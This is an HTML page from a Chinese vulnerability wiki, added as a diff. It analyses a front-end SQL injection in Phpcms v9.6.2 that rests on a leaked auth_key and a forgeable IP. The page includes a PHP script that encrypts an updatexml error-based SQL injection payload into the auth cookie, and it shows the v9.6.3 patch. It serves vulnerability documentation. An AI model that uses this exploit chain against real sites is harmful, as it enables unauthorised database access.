@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Phpcms/Phpcms%20v9.6.2%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Phpcms v9.6.2 前台sql注入 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Phpcms v9.6.2 \u524d\u53f0sql\u6ce8\u5165", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%EF%BC%88CVE-2018-19127%EF%BC%89Phpcms2008%20Type.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%EF%BC%88CVE-2018-19127%EF%BC%89Phpcms2008%20Type.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Phpcms%20v9.6.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Phpcms%20v9.6.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-link">
+        Phpcms v9.6.2 任意文件下载
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="phpcms-v962-sql">Phpcms v9.6.2 前台sql注入<a class="headerlink" href="#phpcms-v962-sql" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Phpcms v9.6.2</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>这个版本的的注入，是建立在任意文件读取漏洞存在的情况下才可利用。通过任意文件读取漏洞获得加解密的
+<strong>key</strong> 值，我们可以用这个 <strong>key</strong> 加密我们的 <strong>SQL注入payload</strong>
+。由于程序对解密后的数据并未过滤，最终导致漏洞发生。严格上来讲
+<strong>v9.6.2</strong> 版本的注入只能在 <strong>windows</strong>
+上利用，具体原因在上面的任意文件读取漏洞分析时也说了。下面我们来具体分析一下这个漏洞。</p>
+<p>漏洞文件位于 <strong>phpcms/modules/member/classes/foreground.class.php</strong>
+，代码如下图。我们可以明显看到下图第33行，程序直接将解密后的数据未经过滤直接带入查询。而待解密数据
+<strong>$phpcms_auth</strong> 和解密秘钥 <strong>$auth_key</strong> 均可构造。</p>
+<p><img alt="" src="../resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId25.png" /></p>
+<p>我们先来看一下待解密数据 <strong>$phpcms_auth</strong>
+如何构造。从下图中，可以看出程序将从 <strong>cookie</strong> 中的 <strong>xxx_auth</strong>
+字段经过 <strong>sys_auth</strong> 函数解密后，返回给了 <strong>$phpcms_auth</strong>
+，而默认情况下使用 <strong>pc_base::load_config(\'system\', \'auth_key\')</strong>
+作为加解密的 <strong>key</strong> 值。</p>
+<p><img alt="" src="../resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png" /></p>
+<p>而 <strong>pc_base::load_config(\'system\', \'auth_key\')</strong>
+的值在网站搭建好后，会存储在 <strong>caches/configs/system.php</strong>
+中，我们可以通过任意文件读取来获得这个值。</p>
+<p><img alt="" src="../resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId27.png" /></p>
+<p>现在 <strong>$phpcms_auth</strong> 已经搞定了，我们再来看看 <strong>$auth_key =
+get_auth_key(\'login\')</strong> 如何构造，跟进 <strong>get_auth_key</strong>
+的代码。我们可以看到 <strong>$auth_key</strong> 由
+<strong>$prefix、pc_base::load_config(\'system\',\'auth_key\')、ip()</strong>
+三个元素决定。前两个都是已知的，而第三个获取用户IP的函数存在IP伪造的问题，也可以是固定的。</p>
+<p><img alt="" src="../resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId28.png" /></p>
+<p>所以 <strong>get_auth_key(\'login\')</strong>
+的值也是我们可以构造的，剩下的事情只要我们将 <strong>payload</strong>
+传给加密函数加密两次即可。我们最后再来看一下 <strong>PHPCMS v9.6.3</strong>
+中是如何修复这个漏洞的，补丁如下：</p>
+<p><img alt="" src="../resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId29.png" /></p>
+<p>可以明显看到，补丁将解密后获得的 <strong>$userid</strong> 进行了强转。</p>
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>分析完毕后得到大致流程：</p>
+<p>解密操作：get_cookie('auth')
+得到$phpcms_auth，get_auth_key('login')得到$auth_key，然后sys_auth($phpcms_auth,
+'DECODE', $auth_key)。</p>
+<p>再通俗些的话：sys_auth方法对cookie中包含auth的参数名对应的密文值，先使用配置文件中的auth_key进行sys_auth得到的值作为第一次解密后的值，然后使用配置文件中的auth_key的值与客户端请求的IP拼接做MD5加密的值做为新的key，第一次解密后的值与新的key最后传入sys_auth进行解密得到最终的明文。</p>
+<p>反之加密方法便是：</p>
+<p>使用配置文件中的auth_key的值与客户端请求的IP拼接做MD5加密的值做为新的key，使用新的key与明文进行sys_auth得到的值作为第一次加密的密文，然后使用配置文件中的auth_key作为key与第一次加密的密文传入sys_auth得到的值作为最终的密文，也就是cookie字段名称中包含auth的参数对应的值。</p>
+<p><strong>如下是将各个文件中的加密解密方法抓取出来稍作修改，在本地进行payload的加解密操作：</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">sys_auth</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$operation</span> <span class="o">=</span> <span class="s1">&#39;ENCODE&#39;</span><span class="p">,</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span><span class="nv">$auth_key</span><span class="o">=</span><span class="s1">&#39;7G6idVtMAxhgFVu5vGp1&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$ckey_length</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+    <span class="nv">$key</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span> <span class="o">?</span> <span class="nv">$key</span> <span class="o">:</span> <span class="nv">$auth_key</span><span class="p">);</span>
+    <span class="nv">$keya</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+    <span class="nv">$keyb</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+    <span class="nv">$keyc</span> <span class="o">=</span> <span class="nv">$ckey_length</span> <span class="o">?</span> <span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">)</span><span class="o">:</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">microtime</span><span class="p">()),</span> <span class="o">-</span><span class="nv">$ckey_length</span><span class="p">))</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="nv">$cryptkey</span> <span class="o">=</span> <span class="nv">$keya</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$keya</span><span class="o">.</span><span class="nv">$keyc</span><span class="p">);</span>
+    <span class="nv">$key_length</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">);</span>
+
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">strtr</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">),</span> <span class="s1">&#39;-_&#39;</span><span class="p">,</span> <span class="s1">&#39;+/&#39;</span><span class="p">))</span> <span class="o">:</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%010d&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">?</span> <span class="nv">$expiry</span> <span class="o">+</span> <span class="nb">time</span><span class="p">()</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$string</span><span class="o">.</span><span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="nv">$string</span><span class="p">;</span>
+    <span class="nv">$string_length</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
+
+    <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="nv">$box</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
+
+    <span class="nv">$rndkey</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nv">$key_length</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
+        <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+        <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$string_length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$a</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+        <span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">];</span>
+        <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+        <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
+        <span class="nv">$result</span> <span class="o">.=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$string</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="nv">$box</span><span class="p">[(</span><span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">]));</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">((</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="nb">time</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">)</span><span class="o">.</span><span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+
+            <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$keyc</span><span class="o">.</span><span class="nb">rtrim</span><span class="p">(</span><span class="nb">strtr</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$result</span><span class="p">),</span> <span class="s1">&#39;+/&#39;</span><span class="p">,</span> <span class="s1">&#39;-_&#39;</span><span class="p">),</span> <span class="s1">&#39;=&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">get_auth_key</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">,</span><span class="nv">$suffix</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$ip</span><span class="o">=</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="nv">$auth_key</span><span class="o">=</span><span class="s1">&#39;7G6idVtMAxhgFVu5vGp1&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$prefix</span><span class="o">==</span><span class="s1">&#39;login&#39;</span><span class="p">){</span>
+        <span class="nv">$pc_auth_key</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$auth_key</span><span class="o">.</span><span class="nv">$ip</span><span class="p">);</span>
+    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$prefix</span><span class="o">==</span><span class="s1">&#39;email&#39;</span><span class="p">){</span>
+        <span class="nv">$pc_auth_key</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$auth_key</span><span class="p">);</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="nv">$pc_auth_key</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$auth_key</span><span class="o">.</span><span class="nv">$suffix</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$authkey</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$prefix</span><span class="o">.</span><span class="nv">$pc_auth_key</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$authkey</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">//解密过程</span>
+<span class="c1">//step 1</span>
+<span class="nv">$encryption_str</span> <span class="o">=</span> <span class="s1">&#39;6fc7TB1Y1nIRK5HunMc5HAUw5WkBLLuQGBiOISDhJM4d8N8WHHOvqMaUSyWrZdVdH046oGv_e_Ir6Q157UV-yT5Aksuc_h_4RfwZqsEwDHfQckv4SReOiYFxm083X7Tydcw-nUy8l3nP-ouUGl59sN4&#39;</span><span class="p">;</span>
+<span class="nv">$operation1</span> <span class="o">=</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">;</span>
+<span class="nv">$decryption_step1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">sys_auth</span><span class="p">(</span><span class="nv">$encryption_str</span><span class="p">,</span> <span class="nv">$operation1</span><span class="p">));</span>
+<span class="k">echo</span> <span class="s1">&#39;decryption_step1 result:&#39;</span><span class="o">.</span><span class="nv">$decryption_step1</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+
+<span class="c1">//step 2</span>
+<span class="nv">$decryption_step2</span> <span class="o">=</span> <span class="nv">$decryption_step1</span><span class="p">;</span>
+<span class="nv">$auth_key</span> <span class="o">=</span> <span class="nx">get_auth_key</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s1">&#39;decryption_step2 result:&#39;</span><span class="o">.</span><span class="nx">sys_auth</span><span class="p">(</span><span class="nv">$decryption_step2</span><span class="p">,</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">,</span> <span class="nv">$auth_key</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+
+<span class="k">echo</span> <span class="s1">&#39;-----------------------&#39;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="p">;</span>
+
+
+<span class="c1">//加密过程</span>
+<span class="c1">//step 1</span>
+<span class="nv">$clear_str</span> <span class="o">=</span> <span class="s2">&quot;1&#39;or updatexml(1,concat(0x7e,(select user()),0x7e),1)  or &#39;1    f867fef04bd76d95abe01300951ca336&quot;</span><span class="p">;</span>
+<span class="nv">$operation2</span> <span class="o">=</span> <span class="s1">&#39;ENCODE&#39;</span><span class="p">;</span>
+<span class="nv">$encryption_step1</span> <span class="o">=</span> <span class="nx">sys_auth</span><span class="p">(</span><span class="nv">$clear_str</span><span class="p">,</span> <span class="s1">&#39;ENCODE&#39;</span><span class="p">,</span> <span class="nv">$auth_key</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s1">&#39;encryption_step1 result:&#39;</span><span class="o">.</span><span class="nv">$encryption_step1</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+
+<span class="c1">//step 2</span>
+<span class="nv">$encryption_step2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">sys_auth</span><span class="p">(</span><span class="nv">$encryption_step1</span><span class="p">,</span> <span class="nv">$operation2</span><span class="p">));</span>
+<span class="k">echo</span> <span class="s1">&#39;encryption_step2 result:&#39;</span><span class="o">.</span><span class="nv">$encryption_step2</span><span class="p">;</span>
+</code></pre></div>
+
+<p>使用上面的代码可以进行解密和加密，下图中decryption_step2
+result的值便是对payload进行解密的最终结果，encryption_step2的值是对payload进行加密的最终结果。</p>
+<p><img alt="" src="../resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId31.png" /></p>
+<p>最终利用的现象，cookie中的YDVIB_auth参数名称，前缀是安装时候生成的可能不一样，可以在配置文件中找到对应的值，可以先注册普通用户然后看服务端下发的cookie中字段名称中xxx_auth的参数名称，便是存在漏洞的位置。</p>
+<p><img alt="" src="../resource/Phpcmsv9.6.2%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId32.png" /></p>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://www.freebuf.com/column/158352.html">https://www.freebuf.com/column/158352.html</a></p>
+<p><a href="https://xz.aliyun.com/t/5731">https://xz.aliyun.com/t/5731</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%EF%BC%88CVE-2018-19127%EF%BC%89Phpcms2008%20Type.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%EF%BC%88CVE-2018-19127%EF%BC%89Phpcms2008%20Type.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Phpcms%20v9.6.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Phpcms%20v9.6.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-link">
+        Phpcms v9.6.2 任意文件下载
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
